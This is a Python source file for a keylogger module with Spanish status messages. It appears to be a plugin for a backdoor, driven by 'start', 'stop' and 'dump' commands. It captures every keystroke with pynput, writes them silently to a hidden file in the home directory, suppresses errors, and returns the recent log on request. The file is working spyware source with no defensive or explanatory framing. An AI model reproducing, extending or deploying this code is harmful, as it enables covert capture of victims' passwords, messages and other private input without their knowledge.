import os
import threading
import time
import platform

KEYLOG_PATH = os.path.expanduser("~/.keylog_backdoors.txt")
logging = False
logger_thread = None

def keylog_worker():
    global logging
    try:
        if os.name == "nt":
            import pynput.keyboard as pynput
        else:
            from pynput import keyboard as pynput
        with open(KEYLOG_PATH, "a", encoding="utf-8", errors="ignore") as f:
            def on_press(key):
                try:
                    f.write(str(key.char))
                except AttributeError:
                    f.write(f"<{key}>")
                f.flush()
            listener = pynput.Listener(on_press=on_press)
            listener.start()
            while logging:
                time.sleep(1)
            listener.stop()
    except Exception:
        pass

def run(cmd, *args):
    global logging, logger_thread
    if cmd == "start":
        if logging:
            return "[!] Keylogger ya activo."
        logging = True
        logger_thread = threading.Thread(target=keylog_worker, daemon=True)
        logger_thread.start()
        return "[+] Keylogger iniciado."
    elif cmd == "stop":
        logging = False
        if logger_thread:
            logger_thread.join(timeout=2)
        return "[+] Keylogger detenido."
    elif cmd == "dump":
        if os.path.exists(KEYLOG_PATH):
            with open(KEYLOG_PATH, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()[-4096:]  # Solo últimos 4K chars para no saturar
        return "[!] No hay log de teclas."
    else:
        return "[!] Comando no soportado en keylogger."


